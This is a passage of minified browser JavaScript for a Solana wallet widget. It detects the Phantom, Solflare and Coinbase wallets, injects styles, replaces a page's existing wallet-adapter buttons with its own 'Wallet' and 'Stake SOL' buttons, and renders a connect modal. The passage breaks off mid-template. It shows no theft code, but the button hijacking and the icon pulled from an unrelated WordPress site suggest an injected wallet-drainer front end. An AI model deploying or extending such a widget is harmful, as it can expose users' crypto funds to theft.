"use strict";(()=>{var x=Object.defineProperty;var h=Object.getOwnPropertySymbols;var y=Object.prototype.hasOwnProperty,N=Object.prototype.propertyIsEnumerable;var b=(d,t,e)=>t in d?x(d,t,{enumerable:!0,configurable:!0,writable:!0,value:e}):d[t]=e,w=(d,t)=>{for(var e in t||(t={}))y.call(t,e)&&b(d,e,t[e]);if(h)for(var e of h(t))N.call(t,e)&&b(d,e,t[e]);return d};var u=class{constructor(){this.isInitialized=!1;this.wallets=[];this.selectedWallet=null;this.connectedPublicKey=null;this.options={network:"mainnet-beta",theme:"light"}}init(t){if(t&&(this.options=w(w({},this.options),t)),typeof window=="undefined"){console.warn("SolanaWidget: Window object not available. Widget can only run in browser environment.");return}typeof window.React!="undefined"&&typeof window.ReactDOM!="undefined"||console.warn("SolanaWidget: React and ReactDOM not found. Please include React CDN scripts."),this.loadStyles(),this.initializeWallets(),this.isInitialized=!0,console.log("SolanaWidget initialized successfully")}initializeWallets(){var t;try{let e=[],n=[],a=[{name:"Phantom",icon:this.getPhantomIcon(),installed:typeof window.phantom!="undefined"||typeof window.navigator!="undefined"&&((t=window.navigator.wallets)==null?void 0:t.Phantom)!==void 0},{name:"Solflare",icon:this.getSolflareIcon(),installed:typeof window.solflare!="undefined"},{name:"Coinbase Wallet",icon:this.getCoinbaseIcon(),installed:typeof window.coinbaseSolana!="undefined"}];a.forEach(o=>{try{let i=this.getWalletProviderIcon(o.name);i&&(o.icon=i)}catch(i){console.warn(`Failed to get icon for ${o.name}:`,i)}}),this.wallets=a,console.log("Wallets initialized:",this.wallets)}catch(e){console.error("Failed to initialize wallets:",e),console.log("Using mock wallets as fallback"),this.wallets=[{name:"Phantom",icon:this.getPhantomIcon(),installed:!0},{name:"Solflare",icon:this.getSolflareIcon(),installed:!0},{name:"Coinbase Wallet",icon:this.getCoinbaseIcon(),installed:!0}]}}getWalletProviderIcon(t){var e,n,a,o,i,l,r;try{switch(t){case"Phantom":if(typeof window.phantom!="undefined"&&((e=window.phantom)!=null&&e.icon))return window.phantom.icon;if(typeof window.navigator!="undefined"&&((a=(n=window.navigator.wallets)==null?void 0:n.Phantom)!=null&&a.icon))return(i=(o=window.navigator.wallets)==null?void 0:o.Phantom)==null?void 0:i.icon;break;case"Solflare":if(typeof window.solflare!="undefined"&&((l=window.solflare)!=null&&l.icon))return window.solflare.icon;break;case"Coinbase Wallet":if(typeof window.coinbaseSolana!="undefined"&&((r=window.coinbaseSolana)!=null&&r.icon))return window.coinbaseSolana.icon;break}}catch(c){console.warn(`Error getting icon for ${t}:`,c)}return null}getPhantomIcon(){return"data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTA4IiBoZWlnaHQ9IjEwOCIgdmlld0JveD0iMCAwIDEwOCAxMDgiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSIxMDgiIGhlaWdodD0iMTA4IiByeD0iMjYiIGZpbGw9IiNBQjlGRjIiLz4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik00Ni41MjY3IDY5LjkyMjlDNDIuMDA1NCA3Ni44NTA5IDM0LjQyOTIgODUuNjE4MiAyNC4zNDggODUuNjE4MkMxOS41ODI0IDg1LjYxODIgMTUgODMuNjU2MyAxNSA3NS4xMzQyQzE1IDUzLjQzMDUgNDQuNjMyNiAxOS44MzI3IDcyLjEyNjggMTkuODMyN0M4Ny43NjggMTkuODMyNyA5NCAzMC42ODQ2IDk0IDQzLjAwNzlDOTQgNTguODI1OCA4My43MzU1IDc2LjkxMjIgNzMuNTMyMSA3Ni45MTIyQzcwLjI5MzkgNzYuOTEyMiA2OC43MDUzIDc1LjEzNDIgNjguNzA1MyA3Mi4zMTRDNjguNzA1MyA3MS41NzgzIDY4LjgyNzUgNzAuNzgxMiA2OSA5MjI5QzY1LjU4OTMgNzUuODY5OSA1OC44Njg1IDgxLjM4NzggNTIuNTc1NCA4MS4zODc4QzQ3Ljk5MzIDgxLjM4NzggNDUuNjcxMyA3OC41MDYzIDQ1LjY3MTMgNzQuNDU5OEM0NS42NzEzIDcyLjk4ODQgNDUuOTc2OCA3MS40NTU2IDQ2LjUyNjcgNjkuOTIyOVpNODMuNjc2MSA0Mi41Nzk0QzgzLjY3NjEgNDYuMTcwNCA4MS41NTc1IDQ3Ljk2NTggNzkuMTg3NSA0Ny45NjU4Qzc2Ljc4MTYgNDcuOTY1OCA3NC42OTg5IDQ2LjE3MDQgNzQuNjk4OSA0Mi41Nzk0Qzc0LjY5ODkgMzguOTg4NSA3Ni43ODE2IDM3LjE5MzEgNzkuMTg3NSAzNy4xOTMxQzgxLjU1NzUgMzcuMTkzMSA4My42NzYxIDM4Ljk4ODUgODMuNjc2MSA0Mi41Nzk0Wk03MC4yMTAzIDQyLjU3OTVDNzAuMjEwMyA0Ni4xNzA0IDY4LjA5MTYgNDcuOTY1OCA2NS43MjE2IDQ3Ljk2NThDNjMuMzE1NyA0Ny45NjU4IDYxLjIzMyA0Ni4xNzA0IDYxLjIzMyA0Mi41Nzk1QzYxLjIzMyAzOC45ODg1IDYzLjMxNTcgMzcuMTkzMSA2NS43MjE2IDM3LjE5MzFDNjguMDkxNiAzNy4xOTMxIDcwLjIxMDMgMzguOTg4NSA3MC4yMTAzIDQyLjU3OTVaIiBmaWxsPSIjRkZGREY4Ii8+Cjwvc3ZnPgo="}getSolflareIcon(){return"data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48c3ZnIGlkPSJTIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA1MCA1MCI+PGRlZnM+PHN0eWxlPi5jbHMtMXtmaWxsOiMwMjA1MGE7c3Ryb2tlOiNmZmVmNDY7c3Ryb2tlLW1pdGVybGltaXQ6MTA7c3Ryb2tlLXdpZHRoOi41cHg7fS5jbHMtMntmaWxsOiNmZmVmNDY7fTwvc3R5bGU+PC9kZWZzPjxyZWN0IGNsYXNzPSJjbHMtMiIgeD0iMCIgd2lkdGg9IjUwIiBoZWlnaHQ9IjUwIiByeD0iMTIiIHJ5PSIxMiIvPjxwYXRoIGNsYXNzPSJjbHMtMSIgZD0iTTI0LjIzLDI2LjQybDIuNDYtMi4zOCw0LjU5LDEuNWMzLjAxLDEsNC41MSwyLjg0LDQuNTEsNS40MywwLDEuOTYtLjc1LDMuMjYtMi4yNSw0LjkzbC0uNDYuNS4xNy0xLjE3Yy42Ny00LjI2LS41OC02LjA5LTQuNzItNy40M2wtNC4zLTEuMzhoMFpNMTguMDUsMTEuODVsMTIuNTIsNC4xNy0yLjcxLDIuNTktNi41MS0yLjE3Yy0yLjI1LS43NS0zLjAxLTEuOTYtMy4zLTQuNTF2LS4wOGgwWk0xNy4zLDMzLjA2bDIuODQtMi43MSw1LjM0LDEuNzVjMi44LjkyLDMuNzYsMi4xMywzLjQ2LDUuMThsLTExLjY1LTQuMjJoMFpNMTMuNzEsMjAuOTVjMC0uNzkuNDItMS41NCwxLjEzLTIuMTcuNzUsMS4wOSwyLjA1LDIuMDUsNC4wOSwyLjcxbDQuNDIsMS40Ni0yLjQ2LDIuMzgtNC4zNC0xLjQyYy0yLS42Ny0yLjg0LTEuNjctMi44NC0yLjk2TTI2LjgyLDQyLjg3YzkuMTgtNi4wOSwxNC4xMS0xMC4yMywxNC4xMS0xNS4zMiwwLTMuMzgtMi01LjI2LTYuNDMtNi43MmwtMy4zNC0xLjEzLDkuMTQtOC43Ny0xLjg0LTEuOTYtMi43MSwyLjM4LTEyLjgxLTQuMjJjLTMuOTcsMS4yOS04Ljk3LDUuMDktOC45Nyw4Ljg5LDAsLjQyLjA0LjgzLjE3LDEuMjktMy4zLDEuODgtNC42MywzLjYzLTQuNjMsNS44LDAsMi4wNSwxLjA5LDQuMDksNC41NSw1LjIybDIuNzUuOTItOS41Miw5LjE0LDEuODQsMS45NiwyLjk2LTIuNzEsMTQuNzMsNS4yMmgwWiIvPjwvc3ZnPg=="}getCoinbaseIcon(){return"data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAyNCIgaGVpZ2h0PSIxMDI0IiB2aWV3Qm94PSIwIDAgMTAyNCAxMDI0IiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8Y2lyY2xlIGN4PSI1MTIiIGN5PSI1MTIiIHI9IjUxMiIgZmlsbD0iIzAwNTJGRiIvPgo8cGF0aCBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGNsaXAtcnVsZT0iZXZlbm9kZCIgZD0iTTE1MiA1MTJDMTUyIDcxMC44MjMgMzEzLjE3NyA4NzIgNTEyIDg3MkM3MTAuODIzIDg3MiA4NzIgNzEwLjgyMyA4NzIgNTEyQzg3MiAzMTMuMTc3IDcxMC44MjMgMTUyIDUxMiAxNTJDMzEzLjE3NyAxNTIgMTUyIDMxMy4xNzcgMTUyIDUxMlpNNDIwIDM5NkM0MDYuNzQ1IDM5NiAzOTYgNDA2Ljc0NSAzOTYgNDIwVjYwNEMzOTYgNjE3LjI1NSA0MDYuNzQ1IDYyOCA0MjAgNjI4SDYwNEM2MTcuMjU1IDYyOCA2MjggNjE3LjI1NSA2MjggNjA0VjQyMEM2MjggNDA2Ljc0NSA2MTcuMjU1IDM5NiA2MDQgMzk2SDQyMFoiIGZpbGw9IndoaXRlIi8+Cjwvc3ZnPgo="}replaceButtons(){this.isInitialized||(console.warn("SolanaWidget: Widget not initialized. Call init() first."),this.init());let t=document.querySelectorAll(".wallet-adapter-button");console.log("Found "+t.length+" wallet buttons to replace"),t.forEach((e,n)=>{var o;let a=document.createElement("div");a.id="solana-wallet-widget-"+n,a.className="solana-wallet-widget-container",(o=e.parentNode)==null||o.replaceChild(a,e),this.renderWidget(a.id)})}loadStyles(){if(document.getElementById("solana-widget-styles"))return;let e=document.createElement("style");e.id="solana-widget-styles",e.textContent=`
      /* Import DM Sans font like in wallet adapter */
      @import url('https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;700&display=swap');
      
      /* Wallet adapter button styles */
      .wallet-adapter-button {
        background-color: transparent;
        border: none;
        color: #fff;
        cursor: pointer;
        display: flex;
        align-items: center;
        font-family: 'DM Sans', 'Roboto', 'Helvetica Neue', Helvetica, Arial, sans-serif;
        font-size: 16px;
        font-weight: 600;
        height: 48px;
        line-height: 48px;
        padding: 0 24px;
        border-radius: 4px;
      }
      
      .wallet-adapter-button-trigger {
        text-align: center !important;
        color: #000 !important;
        background: #ff554f !important;
        background-color: rgb(255, 85, 79);
        border-radius: 4px !important;
        min-width: 145px !important;
        display: block !important;
        position: relative !important;
      }
      
      .wallet-adapter-button:not([disabled]):hover {
        background-color: #ff554f !important;
      }
      
      .wallet-adapter-button-end-icon,
      .wallet-adapter-button-start-icon,
      .wallet-adapter-button-end-icon img,
      .wallet-adapter-button-start-icon img {
        display: flex;
        align-items: center;
        justify-content: center;
        width: 24px;
        height: 24px;
      }
      
      .wallet-adapter-button-end-icon {
        margin-left: 12px;
      }
      
      .wallet-adapter-button-start-icon {
        margin-right: 8px;
      }
      
      .wallet-adapter-button-trigger .wallet-adapter-button-start-icon {
        position: absolute !important;
        top: 12px !important;
      }
      
      /* Custom pi-wallet icon styles from globals.css */
      .pi-wallet {
        background: url("https://vladika.love/wp-content/themes/yootheme/js/wallet-icon.png") !important;
        background-size: contain;
        width: 40px;
        height: 40px;
        display: inline-block;
        position: absolute;
        left: 19px;
        top: 2px;
      }
      
      .w-caption {
        padding-left: 35px !important;
      }
      
      /* Wallet adapter modal styles */
      .wallet-adapter-modal {
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        opacity: 0;
        transition: opacity linear 150ms;
        background: rgba(0, 0, 0, 0.5);
        z-index: 1040;
        overflow-y: auto;
      }
      
      .wallet-adapter-modal.wallet-adapter-modal-fade-in {
        opacity: 1;
      }
      
      .wallet-adapter-modal-button-close {
        display: flex;
        align-items: center;
        justify-content: center;
        position: absolute;
        top: 18px;
        right: 18px;
        padding: 12px;
        cursor: pointer;
        background: #1a1f2e;
        border: none;
        border-radius: 50%;
        background-color: #ff554f !important;
        width: 40px;
        height: 40px;
      }
      
      .wallet-adapter-modal-button-close:focus-visible {
        outline-color: white;
      }
      
      .wallet-adapter-modal-button-close svg {
        fill: #000 !important;
        width: 14px;
        height: 14px;
      }
      
      .wallet-adapter-modal-button-close:hover svg {
        fill: #000 !important;
      }
      
      .wallet-adapter-modal-container {
        display: flex;
        margin: 3rem;
        min-height: calc(100vh - 6rem);
        align-items: center;
        justify-content: center;
      }
      
      @media (max-width: 480px) {
        .wallet-adapter-modal-container {
          margin: 1rem;
          min-height: calc(100vh - 2rem);
        }
      }
      
      .wallet-adapter-modal-wrapper {
        background: #7b100f !important;
        box-sizing: border-box;
        z-index: 1050;
        background: #10141f;
        border-radius: 10px;
        flex-direction: column;
        flex: 1;
        align-items: center;
        max-width: 400px;
        font-family: DM Sans, Roboto, Helvetica Neue, Helvetica, Arial, sans-serif;
        display: flex;
        position: relative;
        box-shadow: 0 8px 20px #0009;
      }
      
      .wallet-adapter-modal-wrapper .wallet-adapter-button {
        width: 100%;
      }
      
      .wallet-adapter-modal-title {
        font-weight: 500;
        font-size: 24px;
        line-height: 36px;
        margin: 0;
        padding: 64px 48px 48px;
        text-align: center;
        color: #fff;
      }
      
      @media (max-width: 374px) {
        .wallet-adapter-modal-title {
          font-size: 18px;
        }
      }
      
      .wallet-adapter-modal-list {
        margin: 0 0 12px 0;
        padding: 0;
        width: 100%;
        list-style: none;
      }
      
      .wallet-adapter-modal-list .wallet-adapter-button {
        font-weight: 400;
        border-radius: 0;
        font-size: 18px;
        color: #fff;
        cursor: pointer;
        background-color: #0000;
        border: none;
        border-radius: 4px;
        align-items: center;
        height: 48px;
        padding: 0 24px;
        font-family: DM Sans, Roboto, Helvetica Neue, Helvetica, Arial, sans-serif;
        font-size: 16px;
        font-weight: 600;
        line-height: 48px;
        display: flex;
        justify-content: space-between;
      }
      
      .wallet-adapter-modal-list .wallet-adapter-button-end-icon,
      .wallet-adapter-modal-list .wallet-adapter-button-start-icon,
      .wallet-adapter-modal-list .wallet-adapter-button-end-icon img,
      .wallet-adapter-modal-list .wallet-adapter-button-start-icon img {
        width: 28px;
        height: 28px;
        margin-right: 12px;
      }
      
      .wallet-adapter-modal-list .wallet-adapter-button span {
        margin-left: 0;
        font-size: 14px;
        opacity: 1;
      }
      
      .wallet-adapter-modal-list .wallet-adapter-button .wallet-adapter-button-name {
        flex: 1;
        text-align: left;
        font-size: 18px;
        font-weight: 400;
      }
      
      .wallet-adapter-modal-list-more {
        cursor: pointer;
        border: none;
        padding: 12px 24px 24px 12px;
        align-self: flex-end;
        display: flex;
        align-items: center;
        background-color: transparent;
        color: #fff;
      }
      
      .wallet-adapter-modal-list-more svg {
        transition: all 0.1s ease;
        fill: rgba(255, 255, 255, 1);
        margin-left: 0.5rem;
      }
      
      .wallet-adapter-modal-list-more-icon-rotate {
        transform: rotate(180deg);
      }
      
      /* Custom styles for the widget */
      .solana-widget-container {
        font-family: 'DM Sans', 'Roboto', 'Helvetica Neue', Helvetica, Arial, sans-serif;
        max-width: 100%;
      }
      
      .solana-widget-btn {
        border: none;
        border-radius: 5em;
        background: #ff8480 !important;
        text-transform: uppercase;
        font-size: 22px;
        font-weight: 700;
        color: #ffffff !important;
        padding: 20px 55px;
        cursor: pointer;
        transition: all 0.2s ease;
        width: 100%;
      }
      
      .solana-widget-btn:hover {
        transform: translateY(-2px);
        box-shadow: 0 4px 12px rgba(153, 69, 255, 0.3);
      }
      
      .solana-widget-btn:active {
        transform: translateY(0);
      }
      
      .solana-widget-btn-connected {
        background: #14F195;
        color: #000;
      }
      
      .solana-widget-popup {
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: rgba(0, 0, 0, 0.5);
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 9999;
      }
      
      .solana-widget-popup-content {
        background: white;
        border-radius: 12px;
        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
        padding: 24px;
        width: 90%;
        max-width: 400px;
      }
      
      .solana-widget-popup-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 20px;
      }
      
      .solana-widget-popup-title {
        font-size: 20px;
        font-weight: 600;
        margin: 0;
      }
      
      .solana-widget-close-btn {
        background: none;
        border: none;
        cursor: pointer;
        font-size: 24px;
        line-height: 1;
      }
      
      .solana-widget-input {
        border: 1px solid #ddd;
        border-radius: 8px;
        font-size: 16px;
        padding: 12px;
        width: 100%;
        margin-bottom: 16px;
        box-sizing: border-box;
      }
      
      .solana-widget-input:focus {
        border-color: #9945FF;
        outline: none;
      }
      
      .solana-widget-balance {
        background: #f5f5f5;
        border-radius: 8px;
        padding: 12px;
        margin-bottom: 16px;
      }
      
      .solana-widget-actions {
        display: flex;
        gap: 12px;
      }
      
      .solana-widget-action-btn {
        flex: 1;
        padding: 12px;
        border-radius: 8px;
        border: none;
        font-weight: 600;
        cursor: pointer;
      }
      
      .solana-widget-confirm-btn {
        background: #9945FF;
        color: white;
      }
      
      .solana-widget-cancel-btn {
        background: #eee;
        color: #333;
      }
      
      .solana-widget-message {
        margin-top: 16px;
        padding: 12px;
        border-radius: 8px;
        text-align: center;
      }
      
      .solana-widget-message-success {
        background: #e6f4ea;
        color: #0a6e22;
      }
      
      .solana-widget-message-error {
        background: #fce8e6;
        color: #c5221f;
      }
      
      .solana-widget-metrics {
        background: #f8f9fa;
        border-radius: 8px;
        padding: 16px;
        margin-bottom: 20px;
      }
      
      .solana-widget-metric {
        display: flex;
        justify-content: space-between;
        margin-bottom: 8px;
      }
      
      .solana-widget-metric:last-child {
        margin-bottom: 0;
      }
      
      .solana-widget-metric-label {
        font-weight: 500;
      }
      
      .solana-widget-metric-value {
        font-weight: 600;
      }
      
      .solana-wallet-list {
        list-style: none;
        padding: 0;
        margin: 0;
      }
      
      .solana-wallet-item {
        display: flex;
        align-items: center;
        padding: 12px;
        border-radius: 8px;
        margin-bottom: 8px;
        cursor: pointer;
        transition: background-color 0.2s;
        width: 100%;
        text-align: left;
        border: none;
        background: transparent;
      }
      
      .solana-wallet-item:hover {
        background-color: #f5f5f5;
      }
      
      .solana-wallet-item-start-icon {
        width: 24px;
        height: 24px;
        margin-right: 12px;
        border-radius: 50%;
      }
      
      .solana-wallet-item-name {
        flex: 1;
        font-weight: 500;
        text-align: left;
      }
      
      .solana-wallet-item-detected {
        font-size: 12px;
        color: #666;
        margin-left: 8px;
      }
      
      .solana-wallet-collapse {
        height: 0;
        overflow: hidden;
        transition: height 250ms ease-out;
      }
      
      .solana-wallet-collapse.expanded {
        height: auto;
      }
      
      .solana-wallet-connected-info {
        background: #f0f8ff;
        border-radius: 8px;
        padding: 12px;
        margin-bottom: 16px;
        text-align: center;
      }
      
      .solana-wallet-connected-name {
        font-weight: 600;
        margin-bottom: 4px;
      }
      
      .solana-wallet-connected-address {
        font-family: monospace;
        font-size: 14px;
        color: #666;
        word-break: break-all;
      }
      
      /* Styles for connected wallet button */
      .wallet-adapter-button-connected {
        background: #1a1f2e !important;
        color: white !important;
        min-width: 200px !important;
        display: flex !important;
        align-items: center !important;
        justify-content: flex-start !important;
      }
      
      .wallet-adapter-button-connected .wallet-adapter-button-start-icon {
        position: static !important;
        margin-right: 8px !important;
        display: flex !important;
        align-items: center !important;
        justify-content: center !important;
      }
      
      .wallet-adapter-button-connected .wallet-adapter-button-name {
        flex: 1 !important;
        text-align: left !important;
        margin: 0 !important;
      }
      
      .wallet-adapter-button-connected .wallet-adapter-button-end-icon {
        margin-left: auto !important;
        display: flex !important;
        align-items: center !important;
        justify-content: center !important;
      }
      
      /* Context menu styles */
      .wallet-adapter-dropdown {
        position: absolute;
        z-index: 1050;
        background: #1a1f2e;
        border-radius: 8px;
        box-shadow: 0 8px 20px rgba(0, 0, 0, 0.6);
        padding: 8px 0;
        min-width: 200px;
        display: none;
      }
      
      .wallet-adapter-dropdown-list {
        list-style: none;
        margin: 0;
        padding: 0;
      }
      
      .wallet-adapter-dropdown-list-item {
        padding: 12px 24px;
        cursor: pointer;
        display: flex;
        align-items: center;
        color: white;
        font-family: 'DM Sans', 'Roboto', 'Helvetica Neue', Helvetica, Arial, sans-serif;
        font-size: 14px;
        font-weight: 600;
        transition: background-color 0.1s ease;
      }
      
      .wallet-adapter-dropdown-list-item:hover {
        background-color: #2a2f3e;
      }
      
      .wallet-adapter-dropdown-list-item-icon {
        margin-right: 12px;
        width: 16px;
        height: 16px;
        display: flex;
        align-items: center;
        justify-content: center;
      }
    `,document.head.appendChild(e)}renderWidget(t){let e=document.getElementById(t);if(!e){console.error("SolanaWidget: Container with id '"+t+"' not found");return}e.innerHTML="";let n=document.createElement("div");n.className="solana-widget-container";let a=document.createElement("button");a.className="wallet-adapter-button wallet-adapter-button-trigger";let o=document.createElement("i");o.className="pi-wallet";let i=document.createElement("span");i.className="w-caption",i.textContent="Wallet",a.appendChild(o),a.appendChild(i),a.onclick=()=>this.handleConnectClick(),n.appendChild(a),e.appendChild(n);let l=document.createElement("button");l.className="solana-widget-btn",l.style.marginTop="12px",l.textContent="Stake SOL",l.onclick=()=>this.handleStakeClick(),n.appendChild(l)}handleConnectClick(){this.selectedWallet?this.showContextMenu():this.showWalletSelectionModal()}showContextMenu(){let t=document.querySelector(".wallet-adapter-dropdown");t&&document.body.removeChild(t);let e=document.createElement("div");e.className="wallet-adapter-dropdown",e.innerHTML=`
      <ul class="wallet-adapter-dropdown-list">
        <li class="wallet-adapter-dropdown-list-item" data-action="copy">
          <i class="wallet-adapter-dropdown-list-item-icon">
            <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M5.5 2.5H10.5C11.0523 2.5 11.5 2.94772 11.5 3.5V4.5H12.5C13.0523 4.5 13.5 4.94772 13.5 5.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H5.5C4.94772 13.5 4.5 13.0523 4.5 12.5V5.5C4.5 4.94772 4.94772 4.5 5.5 4.5H6.5V3.5C6.5 2.94772 6.94772 2.5 7.5 2.5H10.5ZM10.5 3.5H7.5V4.5H10.5V3.5ZM5.5 5.5V12.5H12.5V5.5H5.5Z" fill="white"/>
              <path d="M3.5 5.5C3.5 4.94772 3.94772 4.5 4.5 4.5H5.5V3.5C5.5 2.39543 6.39543 1.5 7.5 1.5H10.5C11.6046 1.5 12.5 2.39543 12.5 3.5V4.5H13.5C14.6046 4.5 15.5 5.39543 15.5 6.5V12.5C15.5 13.6046 14.6046 14.5 13.5 14.5H6.5C5.39543 14.5 4.5 13.6046 4.5 12.5V11.5H3.5C2.39543 11.5 1.5 10.6046 1.5 9.5V6.5C1.5 5.39543 2.39543 4.5 3.5 4.5V5.5ZM3.5 5.5H4.5V9.5H3.5V5.5ZM6.5 13.5V12.5H13.5V6.5H12.5V9.5C12.5 10.6046 11.6046 11.5 10.5 11.5H3.5V12.5C3.5 13.0523 3.94772 13.5 4.5 13.5H6.5Z" fill="white"/>
            </svg>
          </i>
          <span>Copy address</span>
        </li>
        <li class="wallet-adapter-dropdown-list-item" data-action="change">
          <i class="wallet-adapter-dropdown-list-item-icon">
            <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M8 1.5C4.41015 1.5 1.5 4.41015 1.5 8C1.5 11.5899 4.41015 14.5 8 14.5C11.5899 14.5 14.5 11.5899 14.5 8C14.5 4.41015 11.5899 1.5 8 1.5ZM8 13.5C4.96777 13.5 2.5 11.0322 2.5 8C2.5 4.96777 4.96777 2.5 8 2.5C11.0322 2.5 13.5 4.96777 13.5 8C13.5 11.0322 11.0322 13.5 8 13.5Z" fill="white"/>
              <path d="M8 4.5C7.44772 4.5 7 4.94772 7 5.5V8C7 8.26522 7.10536 8.51957 7.29289 8.70711L9.29289 10.7071C9.68342 11.0976 10.3166 11.0976 10.7071 10.7071C11.0976 10.3166 11.0976 9.68342 10.7071 9.29289L9 7.58579V5.5C9 4.94772 8.55228 4.5 8 4.5Z" fill="white"/>
            </svg>
          </i>
          <span>Change wallet</span>
        </li>
        <li class="wallet-adapter-dropdown-list-item" data-action="disconnect">
          <i class="wallet-adapter-dropdown-list-item-icon">
            <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M5 3.5C5 3.22386 5.22386 3 5.5 3H9.5C9.77614 3 10 3.22386 10 3.5V4H5V3.5Z" fill="white"/>
              <path d="M3 6C3 5.44772 3.44772 5 4 5H12C12.5523 5 13 5.44772 13 6V10C13 10.5523 12.5523 11 12 11H4C3.44772 11 3 10.5523 3 10V6ZM4 6V10H12V6H4Z" fill="white"/>
              <path d="M6 7C6 6.44772 6.44772 6 7 6H9C9.55228 6 10 6.44772 10 7C10 7.55228 9.55228 8 9 8H7C6.44772 8 6 7.55228 6 7Z" fill="white"/>
              <path d="M2 4C2 2.89543 2.89543 2 4 2H12C13.1046 2 14 2.89543 14 4V12C14 13.1046 13.1046 14 12 14H4C2.89543 14 2 13.1046 2 12V4ZM4 3C3.44772 3 3 3.44772 3 4V12C3 12.5523 3.44772 13 4 13H12C12.5523 13 13 12.5523 13 12V4C13 3.44772 12.5523 3 12 3H4Z" fill="white"/>
            </svg>
          </i>
          <span>Disconnect</span>
        </li>
      </ul>
    `;let n=document.querySelector(".wallet-adapter-button-connected");if(n){let i=n.getBoundingClientRect();e.style.position="absolute",e.style.top=i.bottom+window.scrollY+"px",e.style.left=i.left+window.scrollX+"px",e.style.display="block"}e.querySelectorAll(".wallet-adapter-dropdown-list-item").forEach(i=>{i.addEventListener("click",l=>{let r=l.currentTarget.getAttribute("data-action");this.handleContextMenuAction(r||""),document.body.removeChild(e)})});let o=i=>{!e.contains(i.target)&&!i.target.closest(".wallet-adapter-button-connected")&&(document.body.removeChild(e),document.removeEventListener("click",o))};document.addEventListener("click",o),document.body.appendChild(e)}handleContextMenuAction(t){switch(t){case"copy":this.connectedPublicKey&&navigator.clipboard.writeText(this.connectedPublicKey).then(()=>{console.log("Address copied to clipboard")}).catch(e=>{console.error("Failed to copy address: ",e)});break;case"change":this.showWalletSelectionModal();break;case"disconnect":this.selectedWallet=null,this.connectedPublicKey=null,this.updateButtonLabels(),this.options.onDisconnect&&this.options.onDisconnect();break;default:console.warn("Unknown context menu action:",t)}}showWalletSelectionModal(){let t=document.createElement("div");t.className="wallet-adapter-modal wallet-adapter-modal-fade-in";let e=this.wallets.filter(s=>s.installed),n=this.wallets.filter(s=>!s.installed),a="";e.forEach((s,p)=>{a+=`
        <li>
          <button class="wallet-adapter-button" data-wallet-index="${p}">
            <div style="display: flex; align-items: center;">
              <i class="wallet-adapter-button-start-icon">
                <img src="${s.icon}" alt="${s.name} icon" style="width:24px;height:24px;border-radius:50%;">
              </i>
              <span class="wallet-adapter-button-name">${s.name}</span>
            </div>
            ${s.installed?'<span style="margin-left: auto;">Detected</span>':""}
          </button>
        </li>
      `});let o="";n.forEach((s,p)=>{let g=e.length+p;o+=`
        <li>
          <button class="wallet-adapter-button" data-wallet-index="${g}">
            <div style="display: flex; align-items: center;">
              <i class="wallet-adapter-button-start-icon">
                <img src="${s.icon}" alt="${s.name} icon" style="width:24px;height:24px;border-radius:50%;">
              </i>
              <span class="wallet-adapter-button-name">${s.name}</span>
            </div>
          </button>
        </li>
      `}),t.innerHTML=`
      <div class="wallet-adapter-modal-overlay"></div>
      <div class="wallet-adapter-modal-container">
        <div class="wallet-adapter-modal-wrapper">
          <button class="wallet-adapter-modal-button-close">
            <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M14 12.461L8.3 6.772l5.234-5.233L12.006 0 6.772 5.234 1.54 0 0 1.539l5.234 5.233L0 12.006l1.539 1.528L6.772 8.3l5.69 5.7L14 12.461z" fill="currentColor"/>
            </svg>
          </button>
          <h1 class="wallet-adapter-modal-title">Connect a wallet on Solana to continue</h1>
          <ul class="wallet-adapter-modal-list">
            ${a}
            ${n.length>0?`
              <div class="wallet-adapter-collapse" id="wallet-adapter-modal-collapse" style="display: none;">
                ${o}
              </div>
            `:""}
          </ul>
          ${n.length>0?`
            <button class="wallet-adapter-modal-list-more" id="wallet-adapter-modal-list-more">
              <span>More options</span>
              <svg width="13" height="7" viewBox="0 0 13 7" xmlns="http://www.w3.org/2000/svg">
                <path d="M0.71418 1.626L5.83323 6.26188C5.91574 6.33657 6.0181 6.39652 6.13327 6.43762C6.24844 6.47872 6.37371 6.5 6.50048 6.5C6.62725 6.5 6.75252 6.47872 6.8677 6.43762C6.98287 6.39652 7.08523 6.33657 7.16774 6.26188L12.2868 1.626C12.7753 1.1835 12.3703 0.5 11.6195 0.5H1.37997C0.629216 0.5 0.224175 1.1835 0.71418 1.626Z"></path>
              </svg>
            </button>
          `:""}
        </div>
      </div>
